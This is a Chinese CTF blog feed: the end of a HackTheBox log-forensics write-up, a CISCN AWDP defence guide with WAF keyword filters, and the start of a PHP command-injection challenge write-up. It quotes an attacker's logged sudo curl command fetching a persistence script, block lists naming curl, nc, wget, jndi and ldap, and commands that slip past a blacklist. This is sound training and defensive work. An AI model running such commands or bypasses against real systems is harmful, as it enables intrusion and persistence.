<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>

<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
<blockquote>
<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
</blockquote>
<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>

<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
<p>善于使用搜索引擎</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>

<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2024 线下赛]备战AWDP</title>
    <url>/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP.html</url>
    <content><![CDATA[<p>备战6月23日的CISCN线下赛 AWDP</p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CISCN华东南赛区我们学校是承办方，当然晋级名额变成三队，不过由于本人实力有限加上最后黑灯的时候差一点做出来<code>easycms-revenge</code>，本来都打算退役了。在看到主办方发的晋级名单后，发现我们以倒一晋级线下赛，实在是续了下香火。既然都进了，总不能玩几小时pvz吧，所以打算从今天开始备战AWDP</p>
<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p>
<p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p>
<p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分。</p>
<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><p>这里以xshell和xftp为例</p>
<p>我们先使用xshell连接服务器，进入到test文件夹</p>
<p><img src="/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP/image-20240622220002576.png"></p>
<p>然后新建一个shell，点击新建文件传输</p>
<p><img src="/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP/image-20240622220558021.png"></p>
<p>然后自动弹出来xftp，添加会话连接</p>
<p><img src="/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP/image-20240622220708827.png"></p>
<p>连接好后，右键对应文件点击传输即可</p>
<p><img src="/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP/image-20240622220815691.png"></p>
<h1 id="防守WAF"><a href="#防守WAF" class="headerlink" title="防守WAF"></a>防守WAF</h1><p><a href="https://github.com/Drun1baby/JavaSecFilters/tree/main/PHP">参考文章</a></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafrce($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|tail|flag|exec|base64|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/(system|exec|shell_exec|passthru|eval|assert)/i&#x27;, $_GET[&#x27;do&#x27;])) &#123;</span><br><span class="line">        die(&#x27;hacker&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    return $_GET[&#x27;do&#x27;];</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafsqli($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafxss($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 允许上传的文件类型</span><br><span class="line">$allowedExtensions = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line"></span><br><span class="line">// 上传文件的目录</span><br><span class="line">$uploadDir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">// 检查文件是否上传成功</span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $file = $_FILES[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取文件的扩展名</span><br><span class="line">    $extension = pathinfo($file[&quot;name&quot;], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    // 检查文件类型是否允许上传</span><br><span class="line">    if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">        echo &quot;只允许上传以下类型的文件: &quot; . implode(&quot;, &quot;, $allowedExtensions);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查上传文件是否为真实的图像文件</span><br><span class="line">    if (getimagesize($file[&quot;tmp_name&quot;]) === false) &#123;</span><br><span class="line">        echo &quot;上传文件不是有效的图像文件。&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成一个唯一的文件名以避免重复</span><br><span class="line">    $uniqueFileName = uniqid() . &quot;.&quot; . $extension;</span><br><span class="line"></span><br><span class="line">    // 移动上传的文件到目标目录</span><br><span class="line">    if (move_uploaded_file($file[&quot;tmp_name&quot;], $uploadDir . $uniqueFileName)) &#123;</span><br><span class="line">        echo &quot;文件上传成功！&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件上传失败。&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xmlData = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">$xml = simplexml_load_string($xmlData);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>自定义过滤关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>

<h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><p>自定义过滤关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const keywords = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line"></span><br><span class="line">for (const i of keywords) &#123;</span><br><span class="line">    if (code.includes(i)) &#123;</span><br><span class="line">        console.log(&quot;Hacker!&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> 去到对应的接口下面修改即可</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> @ ban 了几个协议，如果单纯全部阻挡什么 127.0.0.1，业务不一定过得去。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class sqlFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;file|http|jar|gopher|tar|war&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含SQL关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ruoyi.common.xss;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 log4j2 的自定义防护</span><br><span class="line"> @ 过滤 url：在 WebFilter 当中添加 urlPatterns</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class Log4j2Filter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;$|$$|jndi|rmi|ldap|&#123;|&#125;|&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含log4j2关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于文件上传的接口修改</span><br><span class="line"> @ 需要在对应接口中修改</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class securityUpload &#123;</span><br><span class="line">    @RequestMapping(&quot;/securityUpload&quot;)</span><br><span class="line">    public String handleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file)&#123;</span><br><span class="line">        if (file.isEmpty())&#123;</span><br><span class="line">            return &quot;请上传文件&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件名</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        String contentType = file.getContentType();</span><br><span class="line"></span><br><span class="line">        //过滤</span><br><span class="line">        String[] picWhite = &#123;&quot;.png&quot;,&quot;.jpg&quot;,&quot;.gif&quot;,&quot;.webp&quot;,&quot;.bmp&quot;&#125;;</span><br><span class="line">        String[] white_type = &#123;&quot;image/gif&quot;,&quot;image/jpeg&quot;,&quot;image/jpg&quot;,&quot;image/png&quot;&#125;;</span><br><span class="line">        Boolean SuffixFlag = false;</span><br><span class="line">        Boolean TypeFlag = false;</span><br><span class="line">        for (String pic_suffix:picWhite)&#123;</span><br><span class="line">            if (suffix.toLowerCase().equals(pic_suffix))&#123;</span><br><span class="line">                SuffixFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        for (String white_suffix:white_type)&#123;</span><br><span class="line">            if (contentType.toLowerCase().equals(white_suffix))&#123;</span><br><span class="line">                TypeFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!SuffixFlag||!TypeFlag)&#123;</span><br><span class="line">            return &quot;File Type not allow&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filePath = System.getProperty(&quot;user.dir&quot;)+&quot;/tmp&quot;;</span><br><span class="line"></span><br><span class="line">        Date date = new Date();</span><br><span class="line">        SimpleDateFormat dateFormat = new SimpleDateFormat(&quot;yyyyMMddhhmmss&quot;);</span><br><span class="line">        String newfileName = dateFormat.format(date)+Integer.toHexString((int)new Date().getTime())+suffix;</span><br><span class="line"></span><br><span class="line">        File dest = new File(filePath+File.separator+newfileName);</span><br><span class="line">        if (!dest.getParentFile().exists())&#123;</span><br><span class="line">            dest.getParentFile().mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        try&#123;</span><br><span class="line">            file.transferTo(dest);</span><br><span class="line">            return &quot;上传成功&quot;;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package FastjsonFilters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 Fastjson 的自定义防护</span><br><span class="line"> @ 针对 1.2.24 版本，则只添加过滤即可，若针对其他版本</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(false); 将 autoTypeSupprt 设置为 false</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Fastjson1224Filter &#123;</span><br><span class="line">    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception &#123;</span><br><span class="line">        if (str != null &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;</span><br><span class="line">            Pattern p = Pattern.compile(pattern, 2);</span><br><span class="line">            boolean StrMatch = p.matcher(input).matches();</span><br><span class="line">            if (StrMatch) &#123;</span><br><span class="line">                return &quot;Hacker get out!!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">            JSON.parseObject(input);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>自定义过滤关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><h2 id="打包-解包"><a href="#打包-解包" class="headerlink" title="打包&amp;解包"></a>打包&amp;解包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf update.tar.gz update.sh file1 file2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf 文件名.tar.gz</span><br></pre></td></tr></table></figure>

<p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><p>php不用重启服务，我们先cp把源码保存下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp index.php ../index.php</span><br></pre></td></tr></table></figure>

<p>然后把改好的文件移到对应位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php index/explorer.php</span><br></pre></td></tr></table></figure>

<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp app.py /app/app.py</span><br><span class="line">ps -ef | grep python | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">cd /app &amp;&amp; nohup python app.py  &gt;&gt; /opt/app.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp ./app.js /app/app.js</span><br><span class="line">ps -ef | grep app.js | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">nohup node /app/app.js || tail -f /dev/null &amp;</span><br></pre></td></tr></table></figure>

<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://5ime.cn/awdp.html">https://5ime.cn/awdp.html</a></p>
<p><a href="https://blog.csdn.net/weixin_51614272/article/details/125527593">https://blog.csdn.net/weixin_51614272/article/details/125527593</a></p>
<p><a href="https://fushuling.com/index.php/2024/06/15/ciscn%e8%a5%bf%e5%8d%97%e5%a4%8d%e8%b5%9bawdp-web/">https://fushuling.com/index.php/2024/06/15/ciscn%e8%a5%bf%e5%8d%97%e5%a4%8d%e8%b5%9bawdp-web/</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>AWDP</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024 初赛</title>
    <url>/article/CISCN2024%E5%88%9D%E8%B5%9B.html</url>
    <content><![CDATA[<p>国赛爆0，特此记录下CISCN复现学习</p>
<span id="more"></span>

<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]); </span><br><span class="line">     if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;, $cmd)) &#123;</span><br><span class="line">         system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>open_basedir</code>限制了只能在当前目录进行操作，对cmd参数进行转义处理</p>
<p>其中escapeshellcmd函数可以在PHP中文手册查到</p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523183210290.png"></p>
<p>可用命令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">tee</span></span><br><span class="line"><span class="built_in">base32</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">php</span><br><span class="line">mysql</span><br><span class="line"><span class="built_in">paste</span>	<span class="comment"># 这个可以直接读文件</span></span><br><span class="line">rev	<span class="comment"># 这个可以直接读文件</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>不过限制太死了，这里考虑PHP命令行参数注入</p>
<p>（可以先<code>php -i</code>看看有无回显）</p>
